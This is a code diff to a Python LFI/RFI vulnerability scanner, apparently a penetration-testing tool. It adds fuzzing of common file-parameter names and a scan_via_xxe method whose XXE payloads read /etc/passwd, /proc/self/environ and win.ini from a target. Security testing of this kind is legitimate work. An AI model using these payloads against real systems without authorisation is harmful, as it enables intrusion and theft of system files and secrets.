@@ -183,7 +183,43 @@ class LFIRFIScanner:
         # Prepare parameters
         test_params = params.copy() if params else {}
         
-        # Try each parameter
+        # Si no hay parámetros, intentar con parámetros comunes
+        if not test_params:
+            common_params = {
+                'file': payload,
+                'page': payload,
+                'path': payload,
+                'include': payload,
+                'document': payload,
+                'folder': payload,
+                'root': payload,
+                'download': payload,
+                'dir': payload,
+                'show': payload,
+                'site': payload,
+                'cat': payload,
+                'view': payload,
+                'content': payload
+            }
+            
+            # Probar cada parámetro común
+            for param, value in common_params.items():
+                try:
+                    response = self.session.get(url, params={param: value}, timeout=10)
+                    if self._check_lfi_vulnerability(response):
+                        result = self._create_result(
+                            url=url,
+                            payload=payload,
+                            param=param,
+                            vuln_type='LFI',
+                            response=response
+                        )
+                        self._add_result(result)
+                        return result
+                except requests.RequestException as e:
+                    self.logger.warning(f"LFI request error for {url}: {str(e)}")
+        
+        # Si hay parámetros específicos, probarlos
         for param in test_params.keys():
             test_params[param] = payload
             try:
@@ -208,7 +244,43 @@ class LFIRFIScanner:
         # Prepare parameters
         test_params = params.copy() if params else {}
         
-        # Try each parameter
+        # Si no hay parámetros, intentar con parámetros comunes
+        if not test_params:
+            common_params = {
+                'file': payload,
+                'page': payload,
+                'path': payload,
+                'include': payload,
+                'document': payload,
+                'folder': payload,
+                'root': payload,
+                'download': payload,
+                'dir': payload,
+                'show': payload,
+                'site': payload,
+                'cat': payload,
+                'view': payload,
+                'content': payload
+            }
+            
+            # Probar cada parámetro común
+            for param, value in common_params.items():
+                try:
+                    response = self.session.get(url, params={param: value}, timeout=10)
+                    if self._check_rfi_vulnerability(response):
+                        result = self._create_result(
+                            url=url,
+                            payload=payload,
+                            param=param,
+                            vuln_type='RFI',
+                            response=response
+                        )
+                        self._add_result(result)
+                        return result
+                except requests.RequestException as e:
+                    self.logger.warning(f"RFI request error for {url}: {str(e)}")
+        
+        # Si hay parámetros específicos, probarlos
         for param in test_params.keys():
             test_params[param] = payload
             try:
@@ -309,6 +381,61 @@ class LFIRFIScanner:
             self.results.append(result)
             if self.callback:
                 self.callback(result)
+                
+    def scan_via_xxe(self, url: str, xxe_results: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """
+        Attempts to perform LFI via successful XXE exploits.
+        
+        Args:
+            url: The target URL
+            xxe_results: List of successful XXE exploitation results
+            
+        Returns:
+            List of LFI via XXE results
+        """
+        results = []
+        
+        for xxe_result in xxe_results:
+            try:
+                # Generate XXE payloads that include file reads
+                payloads = [
+                    f'<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>',
+                    f'<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]><root>&xxe;</root>',
+                    f'<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///var/www/html/index.php"> ]><root>&xxe;</root>',
+                    f'<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://C:/Windows/win.ini"> ]><root>&xxe;</root>'
+                ]
+                
+                for payload in payloads:
+                    try:
+                        # Use the same parameter that was vulnerable to XXE
+                        param = xxe_result.get('parameter', '')
+                        
+                        if param:
+                            response = self.session.post(
+                                url, 
+                                data={param: payload},
+                                headers={'Content-Type': 'application/xml'},
+                                timeout=10
+                            )
+                            
+                            if self._check_lfi_vulnerability(response):
+                                result = self._create_result(
+                                    url=url,
+                                    payload=payload,
+                                    param=param,
+                                    vuln_type='LFI via XXE',
+                                    response=response
+                                )
+                                results.append(result)
+                                
+                                # Notify via callback if provided
+                                self._add_result(result)
+                    except Exception as e:
+                        self.logger.warning(f"Error in LFI via XXE attempt: {str(e)}")
+            except Exception as e:
+                self.logger.error(f"Error processing XXE result: {str(e)}")
+                
+        return results
 
     def _analyze_response(self, response: requests.Response) -> Dict[str, Any]:
         """Enhanced heuristic analysis of responses."""
@@ -324,14 +451,22 @@ class LFIRFIScanner:
         }
         
         # Analyze content
-        content = response.text.lower()
+        try:
+            content = response.text.lower()
+        except Exception:
+            # If response.text fails (possibly due to invalid encoding)
+            content = ""
         
         # Search for patterns
         for category, pattern in indicators.items():
-            matches = re.findall(pattern, response.text, re.I)
-            if matches:
-                score += 1
-                evidence.extend(matches[:3])  # Limit evidence to 3 matches per category
+            try:
+                matches = re.findall(pattern, response.text, re.I)
+                if matches:
+                    score += 1
+                    evidence.extend(matches[:3])  # Limit evidence to 3 matches per category
+            except Exception as e:
+                # Handle case where pattern matching fails
+                self.logger.warning(f"Error in pattern matching: {str(e)}")
                 
         # Analyze suspicious headers
         suspicious_headers = ['X-Powered-By', 'Server', 'X-AspNet-Version']
